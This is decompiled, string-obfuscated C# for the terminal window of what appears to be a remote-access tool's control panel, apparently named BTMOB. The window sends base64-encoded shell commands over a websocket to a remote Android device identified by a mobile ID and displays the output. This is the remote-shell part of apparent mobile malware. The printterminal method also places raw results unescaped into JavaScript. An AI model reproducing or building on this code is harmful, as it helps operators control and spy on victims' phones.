using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class terminal : basestyle
{
	[StructLayout(LayoutKind.Sequential, Size = 1)]
	public struct terminaltype
	{
		public const string Normal = "Normal";

		public const string ssh = "ssh";

		public const string telnet = "telnet";
	}

	private IContainer components;

	public BTClient BTcli;

	public string androidver;

	public string mytype;

	[field: AccessedThroughProperty("termview")]
	internal virtual WebView2 termview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public terminal()
	{
		base.Load += terminal_Load;
		base.FormClosing += terminal_FormClosing;
		androidver = EXGuarder._116E0D4E;
		mytype = EXGuarder._03775613;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.terminal));
		this.termview = new Microsoft.Web.WebView2.WinForms.WebView2();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.termview).BeginInit();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(581, 5);
		this.minibtn.Location = new System.Drawing.Point(623, 5);
		this.closbtn.Location = new System.Drawing.Point(665, 5);
		this.mytitle.Size = new System.Drawing.Size(697, 19);
		this.tobpanelsti.Size = new System.Drawing.Size(707, 29);
		this.termview.AllowExternalDrop = true;
		this.termview.CreationProperties = null;
		this.termview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.termview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.termview.Location = new System.Drawing.Point(2, 67);
		this.termview.Name = EXGuarder._0A67140C;
		this.termview.Size = new System.Drawing.Size(707, 336);
		this.termview.TabIndex = 40;
		this.termview.ZoomFactor = 1.0;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(711, 405);
		base.Controls.Add(this.termview);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._795A0C04);
		base.Name = EXGuarder._54090907;
		this.Text = EXGuarder._54090907;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.termview, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.termview).EndInit();
		base.ResumeLayout(false);
	}

	private async void terminal_Load(object sender, EventArgs e)
	{
		await termview.EnsureCoreWebView2Async();
		termview.NavigateToString(Resources.terminal.Replace("Starting...", androidver));
		Jsterminal rawObject = new Jsterminal(this);
		termview.CoreWebView2.AddHostObjectToScript("jsterminal", rawObject);
		termview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		termview.CoreWebView2.Settings.AreDevToolsEnabled = false;
		myico.Image = BTcli.wallpaper;
		mytitle.Text = BTConst.trminalstr + " | " + mytype;
	}

	public void commandterminal(string comstr)
	{
		string value = EXGuarder._00784020;
		string left = mytype;
		if (Operators.CompareString(left, EXGuarder._2E115F45, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._12626501, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._001D0F02, TextCompare: false) == 0)
				{
					value = EXGuarder._5E291351;
				}
			}
			else
			{
				value = EXGuarder._5E291351;
			}
		}
		else
		{
			value = EXGuarder._00784020;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._55330543, value);
		dictionary.Add(EXGuarder._403F6E30, EXGuarder._53790E6C);
		dictionary.Add(EXGuarder._3D267543, codes.ToBase64(comstr));
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, BTcli.mobid, BTcli.Serverins.WSClient);
	}

	public async void printterminal(string result)
	{
		try
		{
			string javaScript = $"receiveCommandResult(`{result}`)";
			await termview.CoreWebView2.ExecuteScriptAsync(javaScript);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void terminal_FormClosing(object sender, FormClosingEventArgs e)
	{
		string value = EXGuarder._7965354D;
		string left = mytype;
		if (Operators.CompareString(left, EXGuarder._5A287411, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._03555F46, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._4B452640, TextCompare: false) == 0)
				{
					value = EXGuarder._08200B2A;
				}
			}
			else
			{
				value = EXGuarder._08200B2A;
			}
		}
		else
		{
			value = EXGuarder._7965354D;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._48560038, value);
		dictionary.Add(EXGuarder._6255401B, EXGuarder._79092063);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, BTcli.mobid, BTcli.Serverins.WSClient);
	}
}
